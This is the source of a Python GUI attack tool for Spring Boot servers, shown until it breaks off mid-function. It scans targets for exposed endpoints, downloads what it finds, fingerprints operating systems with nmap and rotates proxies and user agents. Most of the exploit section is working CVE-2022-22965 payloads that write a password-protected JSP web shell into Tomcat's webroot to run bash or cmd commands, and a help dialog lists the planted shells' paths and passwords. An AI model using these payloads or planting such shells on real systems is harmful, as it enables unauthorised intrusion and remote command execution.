#!/usr/bin/env python
# coding=utf-8
import webbrowser, sys, json, re, os, random, shutil, ctypes
import nmap
import urllib3, requests
import tkinter as tk
from threading import Thread
from time import sleep, strftime, localtime
from tkinter import messagebox, filedialog, ttk
from tkinter.filedialog import askdirectory
class RootFrom:
    def __init__(self):
        global user_agent
        global cves
        global no_proxies
        global proxy_list
        banner =r'''
  ______                       __                      _______                        __     
 /      \                     |  \                    |       \                      |  \    
|  $$$$$$\  ______    ______   \$$ _______    ______  | $$$$$$$\  ______    ______  _| $$_   
| $$___\$$ /      \  /      \ |  \|       \  /      \ | $$__/ $$ /      \  /      \|   $$ \  
 \$$    \ |  $$$$$$\|  $$$$$$\| $$| $$$$$$$\|  $$$$$$\| $$    $$|  $$$$$$\|  $$$$$$\\$$$$$$  
 _\$$$$$$\| $$  | $$| $$   \$$| $$| $$  | $$| $$  | $$| $$$$$$$\| $$  | $$| $$  | $$ | $$ __ 
|  \__| $$| $$__/ $$| $$      | $$| $$  | $$| $$__| $$| $$__/ $$| $$__/ $$| $$__/ $$ | $$|  \
 \$$    $$| $$    $$| $$      | $$| $$  | $$ \$$    $$| $$    $$ \$$    $$ \$$    $$  \$$  $$
  \$$$$$$ | $$$$$$$  \$$       \$$ \$$   \$$ _\$$$$$$$ \$$$$$$$   \$$$$$$   \$$$$$$    \$$$$ 
          | $$                              |  \__| $$                                       
          | $$                               \$$    $$                                       
           \$$                                \$$$$$$                                        
            ______                                                                           
           /      \                                                                             
          |  $$$$$$\  _______  ______   _______       SpringBootScan-GUI Version: 1.2.2
          | $$___\$$ /       \|      \ |       \    +----------------------------------+ 
           \$$    \ |  $$$$$$$ \$$$$$$\| $$$$$$$\   + ????????? by:  ???13exp???            + 
           _\$$$$$$\| $$      /      $$| $$  | $$   + https://github.com/13exp/        + 
          |  \__| $$| $$_____|  $$$$$$$| $$  | $$   +----------------------------------+   
           \$$    $$ \$$     \\$$    $$| $$  | $$   + ????????? by: ?????????(@AabyssZG)???   + 
            \$$$$$$   \$$$$$$$ \$$$$$$$ \$$   \$$   + https://github.com/AabyssZG/     +
                                                    +----------------------------------+                                                                                                                                   
'''
        user_agent = (
      "Random",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
      "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
      "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
      "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00")
        cves = ("22965-aabyss-linux-post","CVE-2022-22965","CVE-2022-22963","CVE-2022-22947","22965-13exp-shell","22965-aabyss-win-post","22965-aabyss-shell-get")
        no_proxies = []
        proxy_list = []
        self.root = tk.Tk()
        self.root.title("SpringBoot-Scan-GUI")
        self.root.geometry("1024x439")
        self.root.resizable(0,0)
        # ????????????
        tk.Label(self.root,text="????????????").place(x=190,y=5)
        tk.Label(self.root,text="  URL").place(x=100,y=30)
        tk.Label(self.root,text="  URLs").place(x=100,y=60)
        tk.Label(self.root,text="User-Agent").place(x=70,y=90)
        tk.Label(self.root,text="????????????").place(x=90,y=120)
        tk.Label(self.root,text="????????????").place(x=90,y=150)
        tk.Label(self.root,text="??????????????????").place(x=70,y=180)
        tk.Label(self.root,text="????????????").place(x=90,y=210)
        # ????????????
        tk.Label(self.root,text="??????????????????").place(x=180,y=235)
        tk.Label(self.root,text="????????????").place(x=85,y=260)
        tk.Label(self.root,text="CVEs").place(x=100,y=290)
        tk.Label(self.root,text="??????????????????").place(x=60,y=320)
        tk.Label(self.root,text="???????????????").place(x=60,y=350)
        # ??????????????????
        self.url = tk.Entry(self.root)
        self.url.place(x=150,y=30)
        self.urls = tk.Entry(self.root,state='disable')
        self.urls.place(x=150,y=60)
        self.User_Agent = ttk.Combobox(self.root,width=18)
        self.User_Agent['value'] = user_agent
        self.User_Agent.current(0)
        self.User_Agent.place(x=150,y=90)
        self.proxy = tk.Entry(self.root)
        self.proxy.place(x=150,y=120)
        self.proxy_auto = tk.Entry(self.root,state='disable')
        self.proxy_auto.place(x=150,y=150)
        self.info_dict = tk.Entry(self.root,state='disable')
        self.info_dict.place(x=150,y=180)
        # ????????????
        self.download = tk.Entry(self.root,state='disable')
        self.download.place(x=150,y=210)
        # ??????????????????
        self.reverse_tcp = tk.Entry(self.root)
        self.reverse_tcp.place(x=150,y=260)
        self.reverse_tcp.insert(0,"whoami")
        self.CVEs = ttk.Combobox(self.root,width=18)
        self.CVEs['value'] = cves
        self.CVEs.current(0)
        self.CVEs.place(x=150,y=290)
        self.rank =  tk.Entry(self.root)
        self.rank.place(x=150,y=320)
        self.ranks =  tk.Entry(self.root,state='disable')
        self.ranks.place(x=150,y=350)
        tk.Button(self.root,text="??????",command=self.Openfiledir1).place(x=300,y=55)
        tk.Button(self.root,text="??????",command=self.Openfiledir2).place(x=300,y=145)
        tk.Button(self.root,text="??????",command=self.Openfiledir3).place(x=300,y=175)
        tk.Button(self.root,text="??????",command=self.Openfiledir5).place(x=300,y=205)
        tk.Button(self.root,text="??????",command=self.Openfiledir4).place(x=300,y=345)
        # ????????????
        tk.Button(self.root,text="????????????",command=self.scan).place(x=70,y=390)
        tk.Button(self.root,text="????????????",command=self.vule).place(x=140,y=390)
        tk.Button(self.root,text="????????????",command=self.dumpinfo).place(x=210,y=390)
        tk.Button(self.root,text="????????????",command=self.clear).place(x=280,y=390)
        tk.Button(self.root,text="??????",command=self.CVE_2022_22965_Exec).place(x=300,y=255)
        tk.Button(self.root,text="??????",command=self.nmap_scan).place(x=300,y=315)
        # ?????????
        self.vbar = ttk.Scrollbar(self.root)
        self.info_text = tk.Text(self.root,width=95,height=33,yscrollcommand=self.vbar.set)
        self.info_text.insert(tk.INSERT,banner)
        self.info_text.place(x=350,y=0)
        self.vbar.config(command=self.info_text.yview)
        self.vbar.pack(side=tk.RIGHT, fill="y")
        # ????????????
        self.log_var = tk.StringVar(self.root)
        self.log = ttk.Checkbutton(self.root,text="????????????",variable=self.log_var,onvalue="??????",offvalue="?????????")
        self.log.place(x=255,y=5)
        #??????????????????
        menu = tk.Menu(self.root)
        #????????????
        menu_kid = tk.Menu(menu,tearoff=0)
        menu.add_cascade(label='??????',menu=menu_kid)
        menu_kid.add_command(label='Fofa??????',command=Fofa_from)
        menu_kid.add_command(label='????????????',command=self.software_info)
        menu_kid.add_command(label='Shell??????',command=self.shell_info)
        menu_kid.add_separator()
        menu_kid.add_command(label='??????',command=self.Exit,accelerator='Esc')
        menu_info = tk.Menu(menu,tearoff=0)
        menu.add_cascade(label='??????',menu=menu_info)
        dir_clear = tk.Menu(menu,tearoff=0)
        menu_info.add_cascade(label='????????????',menu=dir_clear)
        dir_clear.add_command(label='URLs',command=self.clear_dir1)
        dir_clear.add_command(label='????????????',command=self.clear_dir2)
        dir_clear.add_command(label='????????????',command=self.clear_dir3)
        dir_clear.add_command(label='????????????',command=self.clear_dir5)
        dir_clear.add_command(label='????????????',command=self.clear_dir4)
        dir_clear.add_command(label='ALL??????',command=self.clear_dirs)
        menu_info.add_cascade(label='????????????',command=self.clearlog)
        menu_info.add_cascade(label='urlout.txt',command=self.urloutTxt)
        menu_info.add_cascade(label='????????????',command=self.clear)
        menu_get = tk.Menu(menu,tearoff=0)
        menu.add_cascade(label='??????',menu=menu_get)
        menu_get.add_command(label='????????????',command=self.vule_info)
        menu_get.add_command(label='FafaViewer',command=self.fofa_viewer)
        menu_get.add_command(label='MoreVules',command=self.more_vules)
        menu_get.add_command(label='nmap',command=self.nmap_download)
        menu_get.add_command(label='Git??????',command=self.git_hub)
        def Menu_Right(event):
            global right
            menu_right.post(event.x_root,event.y_root)
        def Scan_Right(event=None):
            self.scan()
        def Vule_Right(event=None):
            self.vule()
        def Dump_Right(event=None):
            self.dumpinfo()
        def Log_Right(event=None):
            self.clearlog()
        def Menu_Esc(event=None):
            self.Exit()
        def urlout_Right(event=None):
            self.urloutTxt()
        def Shell_Right(event=None):
            self.shell_info()
        #??????????????????
        menu_right = tk.Menu(self.root,tearoff=False)
        right = self.root
        menu_right.add_command(label='????????????',command=self.software_info)
        menu_right.add_separator()
        menu_right.add_command(label='????????????',command=self.scan,accelerator='Ctrl+Q')
        menu_right.add_command(label='????????????',command=self.vule,accelerator='Ctrl+R')
        menu_right.add_command(label='????????????',command=self.dumpinfo,accelerator='Ctrl+D')
        menu_right.add_separator()
        right_clear = tk.Menu(menu_right,tearoff=0)
        menu_right.add_cascade(label='????????????',menu=right_clear)
        right_clear.add_command(label='URLs',command=self.clear_dir1)
        right_clear.add_command(label='????????????',command=self.clear_dir2)
        right_clear.add_command(label='????????????',command=self.clear_dir3)
        right_clear.add_command(label='????????????',command=self.clear_dir5)
        right_clear.add_command(label='????????????',command=self.clear_dir4)
        right_clear.add_command(label='ALL??????',command=self.clear_dirs)
        menu_right.add_command(label='????????????',command=self.clearlog,accelerator='Ctrl+F')
        menu_right.add_command(label='urlout',command=self.urloutTxt,accelerator='Ctrl+U')
        menu_right.add_separator()
        menu_right.add_command(label='Shell??????',command=self.shell_info,accelerator='Ctrl+P')
        menu_right.add_separator()
        right_more = tk.Menu(menu_right,tearoff=0)
        menu_right.add_cascade(label='??????',menu=right_more)
        right_more.add_command(label='????????????',command=self.vule_info)
        right_more.add_command(label='FafaViewer',command=self.fofa_viewer)
        right_more.add_command(label='MoreVules',command=self.more_vules)
        right_more.add_command(label='nmap',command=self.nmap_download)
        right_more.add_command(label='Git??????',command=self.git_hub)
        self.root.bind("<Control-q>",Scan_Right)
        self.root.bind("<Control-Q>",Scan_Right)
        self.root.bind("<Control-r>",Vule_Right)
        self.root.bind("<Control-R>",Vule_Right)
        self.root.bind("<Control-d>",Dump_Right)
        self.root.bind("<Control-D>",Dump_Right)
        self.root.bind("<Control-f>",Log_Right)
        self.root.bind("<Control-F>",Log_Right)
        self.root.bind("<Control-p>",Shell_Right)
        self.root.bind("<Control-P>",Shell_Right)
        self.root.bind("<Control-u>",urlout_Right)
        self.root.bind("<Control-U>",urlout_Right)
        self.root.bind("<Escape>",Menu_Esc)
        self.root.bind("<Escape>",Menu_Esc)
        self.root.bind("<Button-3>",Menu_Right)
        self.root.config(menu=menu)
        self.root.mainloop()
    def Exit(self):
        Exit = messagebox.askokcancel('??????','????????????????')
        if Exit == True:
            self.root.destroy()
        sys.exit()
    def shell_info(self):
        messagebox.showinfo("CVE-2022-22965 Shell??????","CVE-2022-22965     :    shell.jsp?cmd=whoami\n22965-13exp-shell :    wbexp.jsp?pwd=13exp&cmd=whoami\n22965-aabyss-shell:    tomcatwar.jsp?pwd=aabysszg&cmd=whoami")
    def vule_info(self):
        webbrowser.open('https://blog.zgsec.cn/index.php/archives/129/')
    def fofa_viewer(self):
        webbrowser.open('https://github.com/wgpsec/fofa_viewer')
    def more_vules(self):
        webbrowser.open('https://github.com/hongyan454/SpringBootVulExploit')
    def software_info(self):
        messagebox.showinfo("????????????","write by 13exp\nhttps://github.com/13exp/SpringBoot-Scan-GUI")
    def nmap_download(self):
        webbrowser.open('https://nmap.org/download.html#windows')
    def git_hub(self):
        webbrowser.open('https://github.com/13exp/SpringBoot-Scan-GUI')
    def Openfiledir1(self):
        filetypes=[('txt','*.txt'),('all','*.*')]
        path = filedialog.askopenfilename(title='????????????',filetypes=filetypes)
        self.urls.config(state='normal')
        if path == '':
            self.urls.config(state='disable')
        else:
            self.urls.delete(0,'end')
            path = path.replace('\\','/')
            self.urls.insert('insert',path)
            self.urls.config(state='disable')
    def Openfiledir2(self):
        # ('xlsx','*.xlsx')
        filetypes=[('txt','*.txt'),('all','*.*')]
        path = filedialog.askopenfilename(title='????????????',filetypes=filetypes)
        self.proxy_auto.config(state='normal')
        if path == '':
            self.proxy_auto.config(state='disable')
        else:
            self.proxy_auto.delete(0,'end')
            path = path.replace('\\','/')
            self.proxy_auto.insert('insert',path)
            self.proxy_auto.config(state='disable')
    def Openfiledir3(self):
        filetypes=[('txt','*.txt'),('all','*.*')]
        path = filedialog.askopenfilename(title='????????????',filetypes=filetypes)
        self.info_dict.config(state='normal')
        if path == '':
            self.info_dict.config(state='disable')
        else:
            self.info_dict.delete(0,'end')
            path = path.replace('\\','/')
            self.info_dict.insert('insert',path)
            self.info_dict.config(state='disable')
    def Openfiledir4(self):
        filetypes=[('txt','*.txt'),('xlsx','*.xlsx'),('all','*.*')]
        path = filedialog.askopenfilename(title='????????????',filetypes=filetypes)
        self.ranks.config(state='normal')
        if path == '':
            self.ranks.config(state='disable')
        else:
            self.ranks.delete(0,'end')
            path = path.replace('\\','/')
            self.ranks.insert('insert',path)
            self.ranks.config(state='disable')
    def Openfiledir5(self):
        filetypes=[('urlout.txt','urlout.txt'),('.txt','*.txt'),('xlsx','*.xlsx'),('all','*.*')]
        path = filedialog.askopenfilename(title='????????????',filetypes=filetypes)
        self.download.config(state='normal')
        if path == '':
            self.download.config(state='disable')
        else:
            self.download.delete(0,'end')
            path = path.replace('\\','/')
            self.download.insert('insert',path)
            self.download.config(state='disable')
    def clear(self):
        self.url.delete(0,'end')
        self.urls.config(state='normal')
        self.urls.delete(0,'end')
        self.urls.config(state='disable')
        self.proxy.delete(0,'end')
        self.proxy_auto.config(state='normal')
        self.proxy_auto.delete(0,'end')
        self.proxy_auto.config(state='disable')
        self.info_dict.config(state='normal')
        self.info_dict.delete(0,'end')
        self.info_dict.config(state='disable')
        self.reverse_tcp.delete(0,'end')
        self.rank.delete(0,'end')
        self.ranks.config(state='normal')
        self.ranks.delete(0,'end')
        self.ranks.config(state='disable')
        self.info_text.delete('1.0','end')
    def clear_dir1(self):
        self.urls.config(state='normal')
        self.urls.delete(0,'end')
        self.urls.config(state='disable')
    def clear_dir2(self):
        self.proxy_auto.config(state='normal')
        self.proxy_auto.delete(0,'end')
        self.proxy_auto.config(state='disable')
    def clear_dir3(self):
        self.info_dict.config(state='normal')
        self.info_dict.delete(0,'end')
        self.info_dict.config(state='disable')
    def clear_dir4(self):
        self.ranks.config(state='normal')
        self.ranks.delete(0,'end')
        self.ranks.config(state='disable')
    def clear_dir5(self):
        self.download.config(state='normal')
        self.download.delete(0,'end')
        self.download.config(state='disable')
    def clear_dirs(self):
        self.urls.config(state='normal')
        self.urls.delete(0,'end')
        self.urls.config(state='disable')
        self.proxy_auto.config(state='normal')
        self.proxy_auto.delete(0,'end')
        self.proxy_auto.config(state='disable')
        self.info_dict.config(state='normal')
        self.info_dict.delete(0,'end')
        self.info_dict.config(state='disable')
        self.ranks.config(state='normal')
        self.ranks.delete(0,'end')
        self.ranks.config(state='disable')
        self.download.config(state='normal')
        self.download.delete(0,'end')
        self.download.config(state='disable')
    def clearlog(self):
        if os.path.exists("scanLogs.log"):
            os.remove("scanLogs.log")
        if os.path.exists("downloadLogs.log"):
            os.remove("downloadLogs.log")
        if os.path.exists("vuleLogs.log"):
            os.remove("vuleLogs.log")
        if os.path.exists("vuleExecLogs.log"):
            os.remove("vuleExecLogs.log")
        messagebox.showinfo("????????????","???????????????")
    def urloutTxt(self):
        if os.path.exists("urlout.txt"):
            os.remove("urlout.txt")
        messagebox.showinfo("urlout","???????????????")
    def uas(self):
        if self.User_Agent.get() == "Random":
            ua_nums = len(user_agent) - 1
            rands = random.randint(1,ua_nums) 
            ua = user_agent[rands]
        else:
            ua = self.User_Agent.get()
        return ua
    # ?????????????????????????????????????????????
    def rank_check(self):
        if self.rank.get() == "" and self.ranks.get() == "":
            rank = ""
        elif self.rank.get() != "" and self.ranks.get() != "":
            rank = ""
        elif self.rank.get() != "" and self.ranks.get() == "":
            rank = self.rank.get()
        else:
            # ??????
            rank = self.ranks.get()
        return rank
    def url_check(self):
        if self.url.get() == "" and self.urls.get() == "":
            url = ""
        elif self.url.get() != "" and self.urls.get() != "":
            url = ""
        elif self.url.get() != "" and self.urls.get() == "":
            url = self.url.get()
        else:
            # ??????
            url = self.urls.get()
        return url
    def proxy_check(self):
        proxy = ""
        if self.proxy.get() != "" and self.proxy_auto.get() != "":
            proxy = ""
        elif self.proxy.get() != "" and self.proxy_auto.get() == "":
            proxy = self.proxy.get()
        elif self.proxy.get() == "" and self.proxy_auto.get() != "":
            proxy = self.proxy_auto.get()
        #????????????????????????
        return proxy
    # ????????? url???rank?????????
    def url_get(self,url):
        urls = []
        if os.path.isfile(url) != True:
            url = url
        else:
            with open(url,"r") as f:
                url_file = f.read().split("\n")
            for i in url_file:
                if i != "":
                    urls.append(i)
            url = urls
        return url
    # ???????????????????????????????????????
    def proxy_get(self):
        proxy = self.proxy_check()
        testurl = "https://www.baidu.com/"
        headers = {"User-Agent": "Mozilla/5.0"}
        #????????????
        if proxy == "":
            proxies = ""
            info = "???????????????"
        else:
            #????????????????????????????????????
            if os.path.isfile(proxy) != True:
                proxies = proxy.strip("/")
                if "/" in proxies:
                    proxies = proxies.split("/")[-1]
                proxies = {
                            "http": "http://%(proxy)s/" % {'proxy': proxies},
                            "https": "http://%(proxy)s/" % {'proxy': proxies}
                            }
                try:
                    requests.packages.urllib3.disable_warnings()
                    res = requests.get(testurl, timeout=10, proxies=proxies, verify=False, headers=headers)
                    if res.status_code == 200:
                        proxies = proxies
                        info = "???????????? {} ".format(proxies)
                        self.info_text.insert(tk.INSERT,info)
                        self.info_text.insert(tk.INSERT, '\n')
                except:
                    info = "??????????????? ?????????????????? {} ".format(proxies)
                    self.info_text.insert(tk.INSERT,info)
                    self.info_text.insert(tk.INSERT, '\n')
                    #??????????????????
                    if self.proxy.get() != "":
                        self.proxy.delete(0,'end')
                    proxies = ""
            #????????????????????????????????????
            else:    
                with open(proxy,"r") as f:
                    proxy_file = f.read().split("\n")
                    for i in proxy_file:
                        if i in no_proxies:
                            pass
                        else:
                            if i != "":
                                i = i.strip("/")
                                if "/" in i:
                                    i = i.split("/")[-1]
                                proxy_list.append(i)
                if len(proxy_list) == len(no_proxies):
                    info = "???????????????"
                    proxies = ""
                else:
                    info = "???????????????"
                    for i in proxy_list:
                        proxies = {
                                "http": "http://%(proxy)s/" % {'proxy': i},
                                "https": "http://%(proxy)s/" % {'proxy': i}
                            }
                        try:
                            requests.packages.urllib3.disable_warnings()
                            res = requests.get(testurl, timeout=10, proxies=proxies, verify=False, headers=headers)
                            if res.status_code == 200:
                                proxies = proxies
                                info = "???????????? {} ".format(proxies)
                                self.info_text.insert(tk.INSERT,info)
                                self.info_text.insert(tk.INSERT, '\n')
                                break
                        except:
                            no_proxies.append(i)
        return info,proxies
    # ????????????????????????
    def info_check(self, urllist, proxies, ua):
        if not os.path.exists("urlout.txt"):
            f = open("urlout.txt", "a")
            f.close()
        title = "================???????????????URL??????SpringBoot??????????????????================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        dir_file = self.info_dict.get()
        if dir_file != "":
            with open(dir_file, 'r') as web:
                webs = web.readlines()
                for web in webs:
                    web = web.strip()
                    if ('://' not in urllist):
                        urllist = str("http://") + str(urllist)
                    if str(urllist[-1]) != "/":
                        u = urllist + "/" + web
                    else:
                        u = urllist + web
                    try:
                        header = {"User-Agent": ua}
                        requests.packages.urllib3.disable_warnings()
                        if proxies != "":
                            r = requests.get(url=u, headers=header, timeout=6, verify=False, proxies=proxies)  # ????????????6???
                        else:
                            r = requests.get(url=u, headers=header, timeout=6, verify=False)  # ????????????6???
                        if r.status_code == 503:
                            pass
                        elif r.status_code == 200:
                            back = "[+] ?????????%d" % r.status_code + ' ' + "????????????URL???:" + u + '    ' + "???????????????:" + str(len(r.content))
                            self.info_text.insert(tk.INSERT,back)
                            self.info_text.insert(tk.INSERT, '\n')
                            f = open("urlout.txt", "a")
                            f.write(u + '\n')
                            f.close()
                        else:
                            back = "[-] ?????????%d" % r.status_code + ' ' + "????????????URL???:" + u
                            self.info_text.insert(tk.INSERT,back)
                            self.info_text.insert(tk.INSERT, '\n')
                    except:
                        back = "[-] URL??? " + u + " ?????????????????????????????????????????????"
                        self.info_text.insert(tk.INSERT,back)
                        self.info_text.insert(tk.INSERT, '\n')
                        break
                    if self.log_var.get() == "??????":
                        with open("scanLogs.log","a") as f:
                            f.write(back + ' ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                            f.write("\n")
            count = len(open("urlout.txt", 'r').readlines())
            if count >= 1:
                back = "[+][+][???] ????????????URL??????SpringBoot???????????????????????????????????? urlout.txt ??????%d?????????" % count
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            #time = strftime("%Y-%m-%d %H:%M:%S",localtime())
            if self.log_var.get() == "??????":
                with open("scanLogs.log","a") as f:
                    f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                    f.write("\n")
        else:
            messagebox.showinfo("??????","???????????????????????????")
    # ????????????????????????
    def Downloads(self,url,name,proxies):
        if not os.path.exists("dump"):
            file_dir = os.mkdir("dump")
        pwd = os.getcwd()
        dumpdir = os.path.join(pwd,"dump")
        requests.packages.urllib3.disable_warnings()
        try:
            back = "[+]???????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
            if proxies != "":
                r = requests.get(url, timeout=6, verify=False, proxies=proxies)  # ????????????6???
            else:
                r = requests.get(url, timeout=6, verify=False)  # ????????????6???
            if r.status_code == 200:
                with open('{}'.format(name),'wb') as f:
                    f.write(r.content)
                filedir = os.path.join(pwd,name)
                dstfile = os.path.join(dumpdir,name)
                if os.path.exists(dstfile):
                    os.remove(dstfile)
                shutil.move(filedir,dumpdir)
                if os.path.exists(name):
                    os.remove(name)
                back = "[+]???????????? {}".format(name)
                self.info_text.insert(tk.INSERT,back)
                self.info_text.insert(tk.INSERT, '\n')
            else:
                pass
        except:
            back = "[-] URL??? " + url + " ???????????????"
            self.info_text.insert(tk.INSERT,back)
            self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("downloadLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    #??????????????????
    def Scan(self):
        back = "[*]????????????????????????"
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        urls = self.url_check()
        url = self.url_get(urls)
        ua = self.uas()
        dict_dir = self.info_dict.get()
        info_proxy = self.proxy_get()
        proxies = info_proxy[-1]
        info = info_proxy[0]
        if '?????????' in info:
            proxies = ""
        if url == "" or dict_dir == "":
            messagebox.showinfo("??????","???????????????????????????????????????(????????????????????????)???")
        elif isinstance(url,list) == True:
            for i in url:
                i = i.strip("\n")
                self.info_check(i, proxies, ua)
        else:
            url = url.strip("\n")
            self.info_check(url, proxies, ua)
        back = "[+]??????????????????"
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("scanLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def scan(self):
        try:
            threadScan = Thread(target=self.Scan)
            threadScan.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
    def DumpInfo(self):
        input_urlfile = self.download.get()
        info_proxy = self.proxy_get()
        proxies = info_proxy[-1]
        info = info_proxy[0]
        if '?????????' in info:
            proxies = ""
        if input_urlfile == "":
            messagebox.showinfo("??????","???????????????????????????")
        else:
            urls = []
            with open('{}'.format(input_urlfile),'r') as f:
                url = f.read().split("\n")
            for i in url:
                if i != "":
                    urls.append(i)
            for i in urls:
                name = i.split('/')[2:]
                name = "-".join(name)
                if ":" in name:
                    name.replace(':',"-")
                if "???" in name:
                    name.replace('???',"-")
                self.Downloads(i,name,proxies)
                if os.path.exists(name):
                    os.remove(name)
        back = "[+]ALL???????????? ??????????????????/dump "
        self.info_text.insert(tk.INSERT,back)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("downloadLogs.log","a") as f:
                f.write(back + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
    def dumpinfo(self):
        try:
            threadDumpInfo = Thread(target=self.DumpInfo)
            threadDumpInfo.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
    def Nmap_Scan(self):
        title = '*+*+*+*+*+*+*+*+*+*+*+*+*+*????????????-????????????*+*+*+*+*+*+*+*+*+*+*+*+*+*'
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n') 
        ip = self.rank.get().strip("\n")
        if "http://" in ip or "https://" in ip:
            ip = ip.split("/")[2]
        if ":" in ip:
            ip = ip.split(":")[0]
        nm = nmap.PortScanner()    
        try:
            result = nm.scan(hosts=ip,arguments='-O')
            win = str(result).count("Windows")
            linux = str(result).count("Linux")
            if win > linux:
                os = "Windows"
            else:
                os = "Linux"
            tar = '[+]target ' + ip + " OS is " + os
            self.info_text.insert(tk.INSERT,tar)
            self.info_text.insert(tk.INSERT, '\n') 
        except:
            pass
        return os
    def nmap_scan(self):
        try:
            threadDumpInfo = Thread(target=self.Nmap_Scan)
            threadDumpInfo.start()
        except KeyboardInterrupt:
            messagebox.showinfo('Info','interrupted by user, killing all threads...')
    def CVE_2022_22965_aabysszg(self, url, proxies):
        title = "================???????????????URL??????CVE-2022-22965????????????================"
        self.info_text.insert(tk.INSERT,title)
        self.info_text.insert(tk.INSERT, '\n')
        ua = self.uas()
        tar = '[+]target ' + url
        self.info_text.insert(tk.INSERT,tar)
        self.info_text.insert(tk.INSERT, '\n')
        if self.log_var.get() == "??????":
            with open("vuleLogs.log","a") as f:
                f.write(tar + '   ' + strftime("%Y-%m-%d %H:%M:%S",localtime()))
                f.write("\n")
        #"Connection":"close"
        Headers_1 = {
            "User-Agent": ua,
            "suffix": "%>//",
            "c1": "Runtime",
            "c2": "<%",
            "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        payload_linux = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_win = """class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        payload_http = """?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22aabysszg%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="""
        data1 = payload_linux
        data2 = payload_win
        getpayload = url + payload_http
        Vule = self.CVEs.get()
        try:
            requests.packages.urllib3.disable_warnings()
            if proxies != "":
                if Vule == "22965-aabyss-linux-post":
                    requests.post(url, headers=Headers_1, data=data1, timeout=6, allow_redirects=False, verify=False, proxies=proxies)
                    sleep(1)
